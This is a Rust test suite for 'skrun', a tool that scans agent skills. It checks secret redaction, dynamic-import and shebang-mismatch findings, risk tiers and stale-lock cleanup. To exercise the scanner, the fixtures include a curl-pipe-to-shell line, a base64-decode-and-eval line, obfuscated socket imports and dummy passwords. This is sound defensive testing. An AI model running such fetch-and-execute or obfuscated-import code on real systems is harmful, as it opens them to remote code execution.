//! The blockers of the release review.
//!
//! Every test writes a fixture and reads it. Nothing of a fixture is ever
//! run: a fixture is only copied, hashed and read.

use skrun::store::{self, AddOptions, Severity};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

/// The `skrun` binary that cargo built for this test run.
const BINARY: &str = env!("CARGO_BIN_EXE_skrun");

/// The secret of the review: the value behind a `password:` of a line that
/// holds another pair before it.
const SECRET: &str = "MyRealSecret123";

/// The line of the review: a pair of a key and a value behind another pair.
const REVIEW_LINE: &str = "description: password: MyRealSecret123";

/// The secret of the review of the redaction: the value behind a
/// `password:` of a line that holds another pair before it.
const NESTED_SECRET: &str = "Hunter2xyz";

/// The line of the review of the redaction: a pair of a key and a value
/// behind another pair.
const NESTED_LINE: &str = "description: password: Hunter2xyz";

/// A secret that names a class of python.
///
/// The value of a pair of a file that is no python is a text and not a
/// name of python, so the value holds a secret even when it names a class.
const CLASS_SECRET: &str = "CorrectHorse";

/// The line of the second review: a pair of a key and a value behind
/// another pair, with a text in brackets behind the value.
///
/// The text behind the value is a text of the document and no code, so the
/// value of the pair holds a secret.
const TEXT_LINE: &str = "description: password: MyRealSecret123 (production)";

/// The line of the second review with the bracket right behind the value.
///
/// The value holds a bracket and the value names no code, so the value is
/// a text of the document and holds a secret.
const CLOSE_LINE: &str = "description: password: MyRealSecret123(production)";

#[test]
fn a_secret_behind_another_pair_is_a_secret() {
    let dir = fixture("review-secret", &[]);
    write(&dir.join("demo/notes.txt"), &format!("{REVIEW_LINE}\n"));
    let path = dir.to_str().unwrap();

    let output = run(&["catalog", "check", path]);

    // The line holds a secret, so the check reports it.
    assert_ne!(output.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("possible secret in `demo/notes.txt:1`"),
        "stdout: {stdout}"
    );
    // The finding keeps the place of the secret, never its value.
    assert!(!stdout.contains(SECRET), "stdout: {stdout}");
    assert!(!String::from_utf8_lossy(&output.stderr).contains(SECRET));
}

#[test]
fn a_secret_behind_another_pair_is_never_printed() {
    let dir = fixture("review-nested-secret", &[]);
    write(&dir.join("demo/notes.txt"), &format!("{NESTED_LINE}\n"));
    let path = dir.to_str().unwrap();

    let output = run(&["catalog", "check", path]);

    // The pair behind another pair is no annotation of Python, so the
    // value of the pair holds a secret and the check reports it.
    assert_ne!(output.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("possible secret in `demo/notes.txt:1`"),
        "stdout: {stdout}"
    );
    // The finding keeps the place of the secret, never its value.
    assert!(!stdout.contains(NESTED_SECRET), "stdout: {stdout}");
    assert!(!String::from_utf8_lossy(&output.stderr).contains(NESTED_SECRET));
}

#[test]
fn the_index_and_the_store_never_hold_the_secret_behind_another_pair() {
    // The description of the skill holds the pair behind another pair, so
    // the value of the pair is a secret of the skill. The value names a
    // class of python, but the value of a file that is no python is a
    // text, so it holds a secret.
    let dir = fixture(
        "review-nested-index",
        &[(
            "SKILL.md",
            "---\nname: demo\ndescription: password: CorrectHorse\ntags: [safe-tag, \"password: CorrectHorse\"]\n---\n\n# Demo\n",
        )],
    );
    let path = dir.to_str().unwrap();
    let store = temp_dir("review-nested-index-store");

    // The index of the command never holds the secret.
    let output = run(&["catalog", "index", path]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, CLASS_SECRET);

    // The file of the index never holds the secret either.
    let index = temp_dir("review-nested-index-file").join("skills.json");
    let output = run(&["catalog", "index", path, "--out", index.to_str().unwrap()]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, CLASS_SECRET);
    let written = fs::read_to_string(&index).unwrap();
    assert!(!written.contains(CLASS_SECRET), "index: {written}");
    // The normal values of the index stay real.
    assert!(written.contains("safe-tag"), "index: {written}");

    // The record of the store never holds the secret.
    let output = run(&[
        "catalog",
        "add",
        dir.join("demo").to_str().unwrap(),
        "--store",
        store.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(
        output.status.code(),
        Some(0),
        "stdout: {} stderr: {}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert_clean(&output, CLASS_SECRET);

    let output = run(&[
        "catalog",
        "inspect",
        "demo",
        "--store",
        store.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, CLASS_SECRET);
}

#[test]
fn a_type_of_python_is_no_secret() {
    let dir = fixture("review-type", &[]);
    // A name of a class can be written in parts and can hold a digit, so
    // `AccessToken` and `Token2` name a class. A qualified name names a
    // class of a module, so `datetime.datetime` names a type.
    write(
        &dir.join("demo/run.py"),
        "import datetime\ntoken: AccessToken\nstamp: datetime.datetime\napi_key: Token2\n",
    );
    let path = dir.to_str().unwrap();

    let output = run(&["catalog", "check", path]);

    // The lines of the file of python hold no secret, so the check reports
    // no error and hides no text.
    assert_eq!(output.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stdout.contains("possible secret"), "stdout: {stdout}");
    assert!(!stderr.contains("possible secret"), "stderr: {stderr}");
    assert!(!stdout.contains("<redacted>"), "stdout: {stdout}");
    assert!(!stderr.contains("<redacted>"), "stderr: {stderr}");
}

#[test]
fn a_value_that_names_a_class_is_a_secret_outside_of_python() {
    let dir = fixture("review-type-text", &[]);
    // A value of a file that is no python is a text and not a name of
    // python, so the value holds a secret even when it names a class.
    write(&dir.join("demo/notes.txt"), "token: AccessToken\n");
    let path = dir.to_str().unwrap();

    let output = run(&["catalog", "check", path]);

    assert_ne!(output.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("possible secret in `demo/notes.txt:1`"),
        "stdout: {stdout}"
    );
    // The finding keeps the place of the secret, never its value.
    assert!(!stdout.contains("AccessToken"), "stdout: {stdout}");
}

#[test]
fn the_index_and_the_store_never_hold_the_secret_of_the_review() {
    let dir = fixture(
        "review-index",
        &[(
            "SKILL.md",
            &format!("---\nname: demo\ndescription: {REVIEW_LINE}\n---\n\n# Demo\n"),
        )],
    );
    let path = dir.to_str().unwrap();
    let store = temp_dir("review-index-store");

    // The index of the command never holds the secret.
    let output = run(&["catalog", "index", path]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);
    // The paths of the index stay real, so the index is still useful.
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("demo/SKILL.md"), "stdout: {stdout}");

    // The file of the index never holds the secret either.
    let index = temp_dir("review-index-file").join("skills.json");
    let output = run(&["catalog", "index", path, "--out", index.to_str().unwrap()]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);
    let written = fs::read_to_string(&index).unwrap();
    assert!(!written.contains(SECRET), "index: {written}");
    assert!(written.contains("demo/SKILL.md"), "index: {written}");

    // The record of the store never holds the secret.
    let output = run(&[
        "catalog",
        "add",
        dir.join("demo").to_str().unwrap(),
        "--store",
        store.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(
        output.status.code(),
        Some(0),
        "stdout: {} stderr: {}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert_clean(&output, SECRET);

    let output = run(&[
        "catalog",
        "inspect",
        "demo",
        "--store",
        store.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);
}

#[test]
fn an_import_whose_name_is_only_known_at_the_call_is_a_finding() {
    let cases = [
        ("run.py", "module = __import__(f\"socket\")\n"),
        ("run.py", "module = __import__(name)\n"),
        ("run.py", "module = __import__(\"so\" + \"cket\")\n"),
        ("run.py", "module = importlib.import_module(name)\n"),
    ];
    for (file, text) in cases {
        let source = skill_fixture("review-dynamic", &[(file, text)]);
        let store = temp_dir("review-dynamic-store");
        let version = add(&source, &store);

        let finding = version
            .findings
            .iter()
            .find(|finding| finding.rule == "dynamic_import")
            .unwrap_or_else(|| panic!("the dynamic_import rule finds {text}"));
        assert_eq!(finding.severity, Severity::Medium, "{text}");
        assert_eq!(finding.path, file, "{text}");
        // A dynamic import can name any module, so the skill needs a
        // container.
        assert_eq!(version.tier, "L2", "{text}");
    }

    // A name in a plain string is a name that the scan can read, so it is
    // no finding.
    let source = skill_fixture(
        "review-dynamic-plain",
        &[("run.py", "module = __import__(\"socket\")\n")],
    );
    let store = temp_dir("review-dynamic-plain-store");
    let version = add(&source, &store);
    assert!(
        !version
            .findings
            .iter()
            .any(|finding| finding.rule == "dynamic_import"),
        "{:?}",
        version.findings
    );
}

#[test]
fn an_import_whose_name_is_only_known_at_the_call_is_a_finding_in_every_script_of_python() {
    // A file of the shell that runs python holds python code, so the rule
    // of the dynamic import reads it as well.
    let source = skill_fixture(
        "review-dynamic-shebang",
        &[("run.sh", "#!/usr/bin/python3\nmodule = __import__(name)\n")],
    );
    let store = temp_dir("review-dynamic-shebang-store");
    let version = add(&source, &store);

    let finding = version
        .findings
        .iter()
        .find(|finding| finding.rule == "dynamic_import")
        .expect("the dynamic_import rule finds the import of the script");
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.path, "run.sh");
    // A dynamic import can name any module, so the skill needs a
    // container.
    assert_eq!(version.tier, "L2");
}

#[test]
fn a_command_that_is_spread_over_two_lines_is_found() {
    let source = skill_fixture(
        "review-multiline",
        &[
            (
                "run.py",
                "import base64\n\nresult = eval(\n    base64.b64decode(payload)\n)\n",
            ),
            (
                "setup.sh",
                "curl https://example.com/install.sh \\\n  | sh\n",
            ),
        ],
    );
    let store = temp_dir("review-multiline-store");
    let version = add(&source, &store);

    let decode = version
        .findings
        .iter()
        .find(|finding| finding.rule == "decode_exec")
        .expect("a decode and execute finding");
    assert_eq!(decode.severity, Severity::High);
    assert_eq!(decode.path, "run.py");
    // The finding points at the line where the match begins.
    assert_eq!(decode.line, Some(3));

    let remote = version
        .findings
        .iter()
        .find(|finding| finding.rule == "remote_exec")
        .expect("a remote execution finding");
    assert_eq!(remote.severity, Severity::High);
    assert_eq!(remote.path, "setup.sh");
    assert_eq!(remote.line, Some(1));

    assert_eq!(version.tier, "L3");
}

#[test]
fn a_shebang_that_does_not_match_the_extension_is_a_finding() {
    let source = skill_fixture("review-shebang", &[("run.py", "#!/bin/sh\necho hello\n")]);
    let store = temp_dir("review-shebang-store");
    let version = add(&source, &store);

    let finding = version
        .findings
        .iter()
        .find(|finding| finding.rule == "mismatched_shebang")
        .expect("a mismatched shebang finding");
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.path, "run.py");
    // The file runs as a shell script, so it needs a container.
    assert_eq!(version.tier, "L2");
}

#[test]
fn a_lock_of_a_process_that_is_gone_is_removed() {
    let source = skill_fixture("review-lock", &[]);
    let store = temp_dir("review-lock-store");
    let id = source
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_string();

    // A lock of a process that is gone is left behind by a crash.
    let locks = store.join("locks");
    fs::create_dir_all(&locks).unwrap();
    let dead = dead_pid();
    write(&locks.join(format!("{id}.lock")), &format!("{dead}\n"));

    let started = Instant::now();
    let version = add(&source, &store);
    let elapsed = started.elapsed();

    // The add goes on, so the stale lock was removed.
    assert!(!version.hash.is_empty());
    assert!(
        elapsed < Duration::from_secs(5),
        "the add waited for the stale lock: {elapsed:?}"
    );
    // The lock of the add is gone with the add.
    assert!(!locks.join(format!("{id}.lock")).exists());
}

#[test]
fn a_secret_behind_another_pair_and_a_text_is_a_secret() {
    let dir = fixture("review-secret-text", &[]);
    write(&dir.join("demo/notes.txt"), &format!("{TEXT_LINE}\n"));
    let path = dir.to_str().unwrap();

    let output = run(&["catalog", "check", path]);

    // The text behind the value is no code, so the value holds a secret
    // and the check reports it.
    assert_ne!(output.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("possible secret in `demo/notes.txt:1`"),
        "stdout: {stdout}"
    );
    // The finding keeps the place of the secret, never its value.
    assert!(!stdout.contains(SECRET), "stdout: {stdout}");
    assert!(!String::from_utf8_lossy(&output.stderr).contains(SECRET));
}

#[test]
fn the_index_and_the_store_never_hold_the_secret_behind_a_text() {
    let dir = fixture(
        "review-secret-text-index",
        &[(
            "SKILL.md",
            &format!("---\nname: demo\ndescription: {TEXT_LINE}\n---\n\n# Demo\n"),
        )],
    );
    let path = dir.to_str().unwrap();
    let store = temp_dir("review-secret-text-index-store");

    // The index of the command never holds the secret.
    let output = run(&["catalog", "index", path]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);

    // The file of the index never holds the secret either.
    let index = temp_dir("review-secret-text-index-file").join("skills.json");
    let output = run(&["catalog", "index", path, "--out", index.to_str().unwrap()]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);
    let written = fs::read_to_string(&index).unwrap();
    assert!(!written.contains(SECRET), "index: {written}");

    // The record of the store never holds the secret.
    let output = run(&[
        "catalog",
        "add",
        dir.join("demo").to_str().unwrap(),
        "--store",
        store.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(
        output.status.code(),
        Some(0),
        "stdout: {} stderr: {}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert_clean(&output, SECRET);

    let output = run(&[
        "catalog",
        "inspect",
        "demo",
        "--store",
        store.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);
}

#[test]
fn a_secret_behind_a_bracket_holds_a_secret() {
    let dir = fixture("review-secret-close", &[]);
    write(&dir.join("demo/notes.txt"), &format!("{CLOSE_LINE}\n"));
    let path = dir.to_str().unwrap();

    let output = run(&["catalog", "check", path]);

    // The value holds a bracket and the value names no code, so the value
    // is a text of the document and the check reports it.
    assert_ne!(output.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("possible secret in `demo/notes.txt:1`"),
        "stdout: {stdout}"
    );
    // The finding keeps the place of the secret, never its value.
    assert!(!stdout.contains(SECRET), "stdout: {stdout}");
    assert!(!String::from_utf8_lossy(&output.stderr).contains(SECRET));
}

#[test]
fn the_index_and_the_store_never_hold_the_secret_behind_a_bracket() {
    let dir = fixture(
        "review-secret-close-index",
        &[(
            "SKILL.md",
            &format!("---\nname: demo\ndescription: {CLOSE_LINE}\n---\n\n# Demo\n"),
        )],
    );
    let path = dir.to_str().unwrap();
    let store = temp_dir("review-secret-close-index-store");

    // The index of the command never holds the secret.
    let output = run(&["catalog", "index", path]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);

    // The file of the index never holds the secret either.
    let index = temp_dir("review-secret-close-index-file").join("skills.json");
    let output = run(&["catalog", "index", path, "--out", index.to_str().unwrap()]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);
    let written = fs::read_to_string(&index).unwrap();
    assert!(!written.contains(SECRET), "index: {written}");

    // The record of the store never holds the secret.
    let output = run(&[
        "catalog",
        "add",
        dir.join("demo").to_str().unwrap(),
        "--store",
        store.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(
        output.status.code(),
        Some(0),
        "stdout: {} stderr: {}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert_clean(&output, SECRET);

    let output = run(&[
        "catalog",
        "inspect",
        "demo",
        "--store",
        store.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(output.status.code(), Some(0));
    assert_clean(&output, SECRET);
}

#[test]
fn a_shebang_of_env_names_the_interpreter_behind_its_options() {
    // A file of python whose shebang names `env` and its option `-S` is a
    // file of python, so it holds no finding of a mismatch.
    let source = skill_fixture(
        "review-env-python",
        &[("run.py", "#!/usr/bin/env -S python3\nprint(\"hello\")\n")],
    );
    let store = temp_dir("review-env-python-store");
    let version = add(&source, &store);
    assert!(
        !version
            .findings
            .iter()
            .any(|finding| finding.rule == "mismatched_shebang"),
        "{:?}",
        version.findings
    );
    assert_eq!(version.tier, "L0");

    // A file of the shell whose shebang names python is a file of the
    // shell that runs python, so the mismatch is a finding and the file
    // needs a container.
    let source = skill_fixture(
        "review-env-shell",
        &[(
            "run.sh",
            "#!/usr/bin/env -S python3\nmodule = __import__(name)\n",
        )],
    );
    let store = temp_dir("review-env-shell-store");
    let version = add(&source, &store);

    let mismatch = version
        .findings
        .iter()
        .find(|finding| finding.rule == "mismatched_shebang")
        .expect("a mismatched shebang finding");
    assert_eq!(mismatch.severity, Severity::Medium);
    assert_eq!(mismatch.path, "run.sh");
    // The file holds python code, so the rule of the dynamic import reads
    // it as well.
    assert!(
        version
            .findings
            .iter()
            .any(|finding| finding.rule == "dynamic_import"),
        "{:?}",
        version.findings
    );
    assert_eq!(version.tier, "L2");
}

#[test]
fn a_file_of_the_window_of_python_that_runs_the_shell_is_a_finding() {
    let source = skill_fixture("review-pyw", &[("run.pyw", "#!/bin/sh\necho hello\n")]);
    let store = temp_dir("review-pyw-store");
    let version = add(&source, &store);

    let finding = version
        .findings
        .iter()
        .find(|finding| finding.rule == "mismatched_shebang")
        .expect("a mismatched shebang finding");
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.path, "run.pyw");
    // The file runs as a shell script, so it needs a container.
    assert_eq!(version.tier, "L2");
}

#[cfg(unix)]
#[test]
fn an_old_lock_of_a_live_process_is_removed() {
    let source = skill_fixture("review-old-lock", &[]);
    let store = temp_dir("review-old-lock-store");
    let id = source
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_string();

    // A lock of a process that runs is held by that process, and the lock
    // is old, so the add that took it never finished.
    let locks = store.join("locks");
    fs::create_dir_all(&locks).unwrap();
    let path = locks.join(format!("{id}.lock"));
    let file = fs::File::options()
        .read(true)
        .write(true)
        .create(true)
        .truncate(false)
        .open(&path)
        .unwrap();
    fs::write(&path, format!("{}\n", std::process::id())).unwrap();
    assert!(hold_lock(&file), "hold the lock of the file");
    let old = SystemTime::now() - Duration::from_secs(20 * 60);
    file.set_times(fs::FileTimes::new().set_modified(old))
        .unwrap();

    let started = Instant::now();
    let version = add(&source, &store);
    let elapsed = started.elapsed();

    // The add goes on, so the old lock was removed.
    assert!(!version.hash.is_empty());
    assert!(
        elapsed < Duration::from_secs(5),
        "the add waited for the old lock: {elapsed:?}"
    );
}

/// Take the lock of a file and hold it, so the lock of the file is held by
/// a process of this test.
#[cfg(unix)]
fn hold_lock(file: &fs::File) -> bool {
    use std::os::fd::AsRawFd;
    unsafe extern "C" {
        fn flock(fd: i32, operation: i32) -> i32;
    }
    // The lock is exclusive and it waits for the process that holds it.
    const LOCK_EX: i32 = 2;
    unsafe { flock(file.as_raw_fd(), LOCK_EX) == 0 }
}

/// The pid of a process that is gone.
fn dead_pid() -> u32 {
    let mut child = Command::new("true").spawn().expect("run a process");
    child.wait().expect("wait for the process");
    child.id()
}

/// Add a skill to a store and return the version that was stored.
fn add(source: &Path, store: &Path) -> store::StoredVersion {
    store::add_skill(&AddOptions {
        source: source.to_path_buf(),
        store: Some(store.to_path_buf()),
        id: None,
        from: None,
    })
    .expect("add the skill to the store")
    .version
}

/// A skills directory with the given files of the demo skill.
fn fixture(name: &str, files: &[(&str, &str)]) -> PathBuf {
    let dir = temp_dir(name);
    write(
        &dir.join("demo/SKILL.md"),
        "---\nname: demo\ndescription: A demo skill.\n---\n\n# Demo\n",
    );
    for (file, text) in files {
        write(&dir.join(format!("demo/{file}")), text);
    }
    dir
}

/// A skill directory with the given files.
///
/// The skill lives in a folder named `demo`, because the id of a skill comes
/// from the name of its source.
fn skill_fixture(name: &str, files: &[(&str, &str)]) -> PathBuf {
    let dir = temp_dir(name).join("demo");
    write(
        &dir.join("SKILL.md"),
        "---\nname: demo\ndescription: A demo skill.\n---\n\n# Demo\n",
    );
    for (file, text) in files {
        write(&dir.join(file), text);
    }
    dir
}

/// Run the built binary with the given arguments.
fn run(args: &[&str]) -> Output {
    Command::new(BINARY)
        .args(args)
        .output()
        .expect("run the skrun binary")
}

/// Assert that neither stream of the command holds the secret.
fn assert_clean(output: &Output, secret: &str) {
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stdout.contains(secret), "stdout: {stdout}");
    assert!(!stderr.contains(secret), "stderr: {stderr}");
}

/// Write a file, creating its parent directories.
fn write(path: &Path, text: &str) {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).unwrap();
    }
    fs::write(path, text).unwrap();
}

/// A fresh directory below the system temporary directory.
fn temp_dir(name: &str) -> PathBuf {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    // The clock of the system is coarse, so two tests of one process can
    // read the same time. The counter keeps the name of every folder
    // unique, so two tests never share a folder.
    static COUNTER: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let count = COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let root = std::env::temp_dir().join(format!(
        "skrun-release-review-{name}-{}-{now}-{count}",
        std::process::id()
    ));
    fs::create_dir_all(&root).unwrap();
    root
}
